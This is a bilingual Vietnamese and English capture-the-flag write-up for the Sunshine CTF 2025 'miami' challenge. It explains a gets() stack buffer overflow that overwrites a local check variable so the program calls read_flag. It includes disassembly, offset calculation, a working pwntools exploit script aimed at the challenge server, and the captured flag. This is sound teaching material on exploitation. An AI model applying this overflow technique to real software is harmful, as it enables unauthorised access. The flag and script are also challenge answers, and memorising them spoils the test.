# Sunshine CTF 2025 — Miami

**Thể loại:** Binary Exploitation (Pwn)

**Độ khó:** Dễ

---

## Tổng quan thử thách

Thử thách cung cấp một tệp thực thi ELF 64-bit cho Linux có tên `miami`. Khi chạy, chương trình yêu cầu nhập mật khẩu của Dexter. Nhiệm vụ của người chơi là tìm ra và khai thác một lỗ hổng trong chương trình để bỏ qua cơ chế xác thực và lấy được flag.

---

## Mục tiêu

Mục tiêu chính là khai thác lỗ hổng tràn bộ đệm (buffer overflow) để thay đổi luồng thực thi của chương trình, buộc nó phải gọi hàm `read_flag` ẩn và in ra nội dung của flag.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức cơ bản về:

- **Phân tích tệp nhị phân:** Sử dụng các công cụ như `file`, `strings`, và `checksec` để thu thập thông tin ban đầu về tệp thực thi.
- **Lỗ hổng tràn bộ đệm (Buffer Overflow):** Hiểu cách hàm `gets` có thể bị lợi dụng để ghi dữ liệu vượt ra ngoài giới hạn của bộ đệm trên stack.
- **Sử dụng trình gỡ lỗi (Debugger):** Dùng GDB để phân tích mã assembly, kiểm tra cấu trúc stack và hiểu logic hoạt động của chương trình.
- **Lập trình khai thác (Exploitation Scripting):** Sử dụng một ngôn ngữ lập trình như Python và thư viện `pwntools` để tự động hóa việc xây dựng và gửi payload đến server từ xa.

---

## Phân tích và hướng tiếp cận

Quá trình giải quyết thử thách được chia thành các bước logic sau:

1. **Phân tích ban đầu:**
    - Sử dụng `file miami` để xác nhận đây là tệp ELF 64-bit, PIE enabled.
    - Sử dụng `strings miami` để tìm các chuỗi văn bản đáng chú ý. Chúng ta phát hiện ra sự tồn tại của hàm `gets` (một dấu hiệu mạnh mẽ của lỗ hổng tràn bộ đệm) và một hàm rất hứa hẹn tên là `read_flag`.
2. **Kiểm tra các cơ chế bảo vệ:**
    - Chạy lệnh `checksec --file=./miami`. Kết quả cho thấy hai thông tin quan trọng:
        - `No canary found`: Không có cơ chế bảo vệ stack canary. Điều này xác nhận rằng việc ghi đè lên các dữ liệu trên stack (bao gồm cả địa chỉ trả về) là hoàn toàn khả thi.
        - `PIE enabled`: Địa chỉ của các hàm sẽ bị ngẫu nhiên hóa mỗi khi chương trình chạy, khiến việc khai thác bằng cách ghi đè địa chỉ trả về trở nên phức tạp hơn một chút.
3. **Phân tích sâu với GDB:**
    - Mở tệp trong GDB và phân tích hàm `vuln` (`disas vuln`).
    - Phân tích mã assembly cho thấy chương trình cấp phát `0x50` (80) bytes trên stack cho các biến cục bộ. Bộ đệm được truyền cho `gets` nằm ở đầu vùng nhớ này, tại offset `0x50` so với con trỏ base pointer (`%rbp`).
    - **Phát hiện mấu chốt:** Chúng ta tìm thấy một logic kiểm tra thú vị ngay sau lời gọi `gets`:
    Chương trình so sánh một biến cục bộ 4-byte tại địa chỉ `0x4(%rbp)` với giá trị hằng số `0x1337c0de`. Nếu chúng bằng nhau, chương trình sẽ tự động gọi hàm `read_flag`.
        
        ```
        0x0000000000001381 <+127>:   cmpl   $0x1337c0de,-0x4(%rbp)
        0x0000000000001388 <+134>:   je     0x139b <vuln+153>
        ...
        0x00000000000013af <+173>:   call   0x1209 <read_flag>
        
        ```
        
    - **Xây dựng chiến lược:** Thay vì thực hiện một cuộc tấn công ghi đè địa chỉ trả về phức tạp (cần vượt qua PIE), chúng ta có thể chọn một con đường đơn giản hơn nhiều: chỉ cần ghi đè lên biến cục bộ này.
        - Khoảng cách từ đầu bộ đệm (`0x50`) đến biến mục tiêu (`0x4`) là: `0x50 - 0x4 = 0x4C`, tức **76 bytes**.
4. **Quy trình giải mã:**
    - Tạo một payload bắt đầu với 76 bytes ký tự đệm (padding).
    - Nối tiếp payload với giá trị `0x1337c0de`, được đóng gói ở dạng little-endian 32-bit (`p32(0x1337c0de)`).
    - Kết nối đến server của thử thách.
    - Gửi payload khi được yêu cầu nhập mật khẩu.
    - Chương trình sẽ ghi đè giá trị thành công, vượt qua phép so sánh và thực thi `read_flag`, trả về flag cho chúng ta.

---

## Kịch bản giải mã (Exploit)

Kịch bản Python sau sử dụng thư viện `pwntools` để tự động hóa hoàn toàn quá trình khai thác.

```python
# solve.py
# Tác giả: foqs & Gemini
# Để chạy: python3 solve.py

from pwn import *

# Thiết lập context cho tệp nhị phân nếu cần phân tích sâu hơn
# context.binary = elf = ELF('./miami')

# Kết nối đến server của thử thách
# Để test cục bộ, sử dụng: p = process('./miami')
p = remote('chal.sunshinectf.games', 25601)

# Tính toán offset từ đầu buffer đến biến mục tiêu
# buffer starts at rbp-0x50
# target variable is at rbp-0x4
# offset = 0x50 - 0x4 = 0x4c = 76
padding_length = 76
padding = b'A' * padding_length

# Giá trị cần ghi đè để thỏa mãn điều kiện so sánh
value_to_overwrite = p32(0x1337c0de)

# Xây dựng payload cuối cùng
payload = padding + value_to_overwrite

log.info(f"Đã xây dựng payload: {payload}")

# Gửi payload sau khi nhận được yêu cầu nhập mật khẩu
p.sendlineafter(b"Enter Dexter's password: ", payload)

# Chuyển sang chế độ tương tác để nhận flag và các output khác
p.interactive()

```

**Kết quả (Flag)**

Khi thực thi kịch bản trên, server sẽ cấp quyền truy cập và trả về flag.

`sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}`

---

## Ghi chú và mẹo

- Đây là một ví dụ điển hình về việc lỗ hổng rõ ràng nhất (ghi đè địa chỉ trả về) không phải lúc nào cũng là con đường khai thác dễ dàng nhất.
- Luôn phân tích kỹ luồng logic của chương trình sau khi phát hiện một lỗ hổng. Đôi khi, các lập trình viên để lại những cơ chế gỡ lỗi hoặc các "cửa sau" logic có thể bị lợi dụng một cách đơn giản hơn nhiều.
- Việc không có Stack Canary là một món quà lớn trong các thử thách pwn. Đây nên là một trong những điều đầu tiên cần kiểm tra với `checksec`.

---

# ENGLISH VERSION

**Category:** Binary Exploitation (Pwn)

**Difficulty:** Easy

---

## Challenge Overview

The challenge provides a 64-bit ELF executable for Linux named `miami`. When run, the program prompts for Dexter's password. The player's task is to find and exploit a vulnerability in the program to bypass the authentication mechanism and retrieve the flag.

---

## Objective

The main goal is to exploit a buffer overflow vulnerability to alter the program's execution flow, forcing it to call a hidden `read_flag` function which will print the flag's content.

---

## Required Knowledge

To solve this challenge, players need a basic understanding of:

- **Binary Analysis:** Using tools like `file`, `strings`, and `checksec` to gather initial information about the executable.
- **Buffer Overflow Vulnerabilities:** Understanding how the `gets` function can be abused to write data beyond the boundaries of a stack buffer.
- **Using a Debugger:** Employing GDB to disassemble code, inspect the stack structure, and understand the program's logic.
- **Exploitation Scripting:** Using a programming language like Python and the `pwntools` library to automate the process of building and sending a payload to a remote server.

---

## Analysis and Approach

The process of solving the challenge was broken down into the following logical steps:

1. **Initial Reconnaissance:**
    - Used `file miami` to confirm it was a 64-bit, PIE-enabled ELF executable.
    - Used `strings miami` to find notable text strings. We discovered the presence of the `gets` function (a strong indicator of a buffer overflow vulnerability) and a very promising function named `read_flag`.
2. **Checking Security Mitigations:**
    - Ran the command `checksec --file=./miami`. The output revealed two critical pieces of information:
        - `No canary found`: The stack canary protection was disabled. This confirmed that overwriting stack data (including the return address) was entirely possible.
        - `PIE enabled`: The addresses of functions would be randomized on each run, making a standard return address overwrite slightly more complex.
3. **In-depth Analysis with GDB:**
    - Opened the file in GDB and disassembled the `vuln` function (`disas vuln`).
    - The assembly code showed that the program allocates `0x50` (80) bytes on the stack for local variables. The buffer passed to `gets` is located at the beginning of this region, at an offset of `0x50` from the base pointer (`%rbp`).
    - **The Key Discovery:** We found an interesting logical check immediately following the `gets` call:
        
        ```
        0x0000000000001381 <+127>:   cmpl   $0x1337c0de,-0x4(%rbp)
        0x0000000000001388 <+134>:   je     0x139b <vuln+153>
        ...
        0x00000000000013af <+173>:   call   0x1209 <read_flag>
        ```        The program compares a 4-byte local variable at address `-0x4(%rbp)` with the constant value `0x1337c0de`. If they are equal, the program jumps to a code path that calls `read_flag` for us.
        
        ```
        
    - **Strategy Formulation:** Instead of performing a more complex return address overwrite (which would require bypassing PIE), we could take a much simpler route: just overwrite this local variable.
        - The distance from the start of our buffer (`0x50`) to the target variable (`0x4`) is: `0x50 - 0x4 = 0x4C`, which is **76 bytes**.
4. **Exploitation Process:**
    - Create a payload that starts with 76 bytes of padding characters.
    - Append the value `0x1337c0de` to the payload, packed as a 32-bit little-endian integer (`p32(0x1337c0de)`).
    - Connect to the challenge server.
    - Send the payload when prompted for the password.
    - The program will successfully overwrite the variable, pass the comparison, and execute `read_flag`, returning the flag to us.

---

## Exploit Script

The following Python script uses the `pwntools` library to completely automate the exploitation process.

```python
# solve.py
# Author: foqs & Gemini
# To run: python3 solve.py

from pwn import *

# Set the context for the binary for deeper analysis if needed
# context.binary = elf = ELF('./miami')

# Connect to the remote challenge server
# For local testing, use: p = process('./miami')
p = remote('chal.sunshinectf.games', 25601)

# Calculate the offset from the start of the buffer to the target variable
# buffer starts at rbp-0x50
# target variable is at rbp-0x4
# offset = 0x50 - 0x4 = 0x4c = 76
padding_length = 76
padding = b'A' * padding_length

# The value needed to overwrite the variable and pass the check
value_to_overwrite = p32(0x1337c0de)

# Build the final payload
payload = padding + value_to_overwrite

log.info(f"Constructed payload: {payload}")

# Send the payload after receiving the password prompt
p.sendlineafter(b"Enter Dexter's password: ", payload)

# Switch to interactive mode to receive the flag and other output
p.interactive()

```

**Result (Flag)**

Upon executing the script, the server grants access and prints the flag.

`sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}`

---

## Postmortem / Tips

- This is a classic example of how the most obvious vulnerability (return address overwrite) is not always the easiest path to exploitation.
- Always analyze the program's logical flow carefully after discovering a vulnerability. Developers sometimes leave behind debug mechanisms or logical backdoors that can be much simpler to abuse.
- The absence of a Stack Canary is a huge gift in pwn challenges. It should be one of the first things to check for with `checksec`.
